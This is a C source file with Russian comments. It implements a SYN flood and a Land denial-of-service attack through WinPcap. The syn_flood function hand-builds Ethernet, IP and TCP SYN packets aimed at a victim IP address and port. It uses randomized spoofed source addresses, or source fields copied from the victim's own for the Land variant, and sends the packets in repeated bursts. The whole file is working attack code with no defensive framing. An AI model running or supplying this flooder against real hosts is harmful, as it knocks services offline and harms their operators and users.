#define WPCAP
#define HAVE_REMOTE

#include <pcap.h>

#include "../headers/types.h"
#include "../headers/ethernet.h"
#include "../headers/ip.h"
#include "../headers/icmp.h"
#include "../headers/tcp.h"

extern pcap_t* select_device();
extern DWORD random_ip_address();
extern WORD checksum(WORD *buffer, DWORD size);

/******************************************************************************/
//  Функция, осуществляющая атаки SYN Flood и Land.
//
//  Входные параметры:
//      char *victim_ip_address - IP адресс жертвы.
//      WORD victim_port - порт жертвы.
//      DWORD iteration - количество повторений.
//      DWORD interval - задержка при посылке пакета.
//      WORD burst - количество повторений итераций.
//      bool land - флаг Land атаки.
//              true - Land атака.
//              false - SYN Flood атака.
//  Выходные параметры:
//      int - возвращаемое значение.
//          '0' - Все в порядке.
//          '-1' - Возникли некоторые ошибки.
/******************************************************************************/
int syn_flood(char *victim_ip_address, WORD victim_port, DWORD iteration, DWORD interval, WORD burst, bool land)
{
    int i = 0;          // Счетчик.

    struct ethernet_header ethernet;    // Ethernet заголовок.
    struct ip_header ip;                // IP заголовок.
    struct tcp_header tcp;              // TCP заголовок.
    struct tcp_pseudoheader tcp_pseudo; // Псевдозаголовок TCP.

    pcap_t *device_handle;                      // Открытое устройство для приема/передачи данных.

    char data[ETHERNET_DATA_LENGTH] = {0};      // Отправляемые данные.
    char packet[65536] = {0};                   // Отправляемый пакет.
    char temp_buffer[65535] = {0};              // Временный буффер.

    memset(data, rand(), ETHERNET_DATA_LENGTH);
    device_handle = select_device();
    // Заполнение Ethernet заголовка.
    ethernet.source_mac_address[0] = 0x00;
    ethernet.source_mac_address[1] = 0x00;
    ethernet.source_mac_address[2] = 0x00;
    ethernet.source_mac_address[3] = 0x00;
    ethernet.source_mac_address[4] = 0x00;
    ethernet.source_mac_address[5] = 0x00;
    ethernet.destination_mac_address[0] = 0xff;
    ethernet.destination_mac_address[1] = 0xff;
    ethernet.destination_mac_address[2] = 0xff;
    ethernet.destination_mac_address[3] = 0xff;
    ethernet.destination_mac_address[4] = 0xff;
    ethernet.destination_mac_address[5] = 0xff;
    ethernet.type = htons(ETHERNET_TYPE_IP);
    // Формирование пакета.
    memcpy(packet, &ethernet, sizeof(ethernet_header));
    // Заолнение IP заголовка.
    ip.version = 4;                                             // Версия протокола IPv4.
    ip.header_length = 5;                                       // Длинна IP заголовка.
    ip.type_of_service = 0;                                     // Тип обслуживания.
    ip.total_length = htons(sizeof(ip_header) +
                            sizeof(tcp_header) +
                            sizeof(data));                      // Длинна = IP заголовок + TCP заголовок + данные.
    ip.identification = 0;                                      // Идентификатор.
    ip.flags_fragmentation_offset = 0;                          // Флаги фрагментации и смещение.
    ip.time_to_live = 255;                                      // Возможное количество пройденных маршрутизаторов.
    ip.protocol = IPPROTO_TCP;                                  // Протокол следующего уровня.
    ip.destination_ip_address = inet_addr(victim_ip_address);   // IP адрес получателя.
    // Заполнение псевдозаголовка TCP.
    tcp_pseudo.destination_ip_address = ip.destination_ip_address;      // IP адрес получателя.
    tcp_pseudo.placeholder = 0;                                         // Заполнитель.
    tcp_pseudo.protocol = IPPROTO_TCP;                                  // Протокол.
    tcp_pseudo.length = htons(sizeof(tcp_header) + sizeof(data));       // Длинна TCP заголовка и длинных.
    // Заполнение TCP заголовка.
    tcp.destination_port = htons(victim_port);          // Порт получателя.
    tcp.acknowledgement_number = 0;                     // Номер подтверждения.
    tcp.header_length = 0x05;                           // Длинна заголовка.
    tcp.flags = TCP_FLAG_SYN;                           // Флаги.
    tcp.urgent_pointer = 0;                             // Указатель срочности.

    while (burst--)
    {
        printf(".");
        for (i = (int)(iteration); i > 0; i--)
        {
            // Заолнение изменяющихся частей IP заголовка.
            ip.header_checksum = 0;                     // Контрольная сумма IP заголовка.
            // Land атака.
            if (land)
                ip.source_ip_address = ip.destination_ip_address;   // IP адрес отправителя.
            else
                ip.source_ip_address = random_ip_address(); // IP адрес отправителя.
            // Вычисление контрольной суммы IP заголовка.
            ip.header_checksum = checksum((WORD*)&ip, sizeof(ip_header));
            // Формирование пакета.
            memcpy((packet + sizeof(ethernet_header)), &ip, sizeof(ip_header));
            // Заполнение изменяющихся частей псевдозаголовка TCP.
            tcp_pseudo.source_ip_address = ip.source_ip_address;    // IP адрес отправителя.
            // Заполняем временный буфер псевдозаголовком TCP протокоа.
            memcpy(temp_buffer, &tcp_pseudo, sizeof(tcp_pseudoheader));
            // Заполнение изменяющихся частей TCP заголовка.
            // Land атака.
            if (land)
                tcp.source_port = tcp.destination_port; // Порт отправителя.
            else
                tcp.source_port = htons((rand() % 0xffff) + 1);      // Порт отправителя.
            tcp.sequence_number = htonl(rand() % 0xffffffff);   // Номер последовательности.
            tcp.window_size = htons((rand() % 0xffff) + 1);     // Размер окна.
            tcp.checksum = 0;                                   // Контрольная сума.
            // Добавляем во временный буфер TCP заголовок.
            memcpy((temp_buffer + sizeof(tcp_pseudoheader)), &tcp, sizeof(tcp_header));
            // Добавляем во временный буфер данные.
            memcpy((temp_buffer + sizeof(tcp_pseudoheader) + sizeof(tcp_header)), &data, sizeof(data));
            // Вычисляем контрольную сумму TCP заголовка.
            tcp.checksum = checksum((WORD*)&temp_buffer, (sizeof(tcp_pseudoheader) + sizeof(tcp_header) + sizeof(data)));
            // Формирование пакета.
            memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header)), &tcp, sizeof(tcp_header));
            memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header)), &data, sizeof(data));
            // Отправляем пакет в сеть.
            if (pcap_sendpacket(device_handle,
                                (u_char*)packet,
                                (sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header) + sizeof(data))) != 0)
            {
                fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(device_handle));
                return -1;
            }
            if (interval)
                Sleep(interval);
        }
    }

    return 0;
}
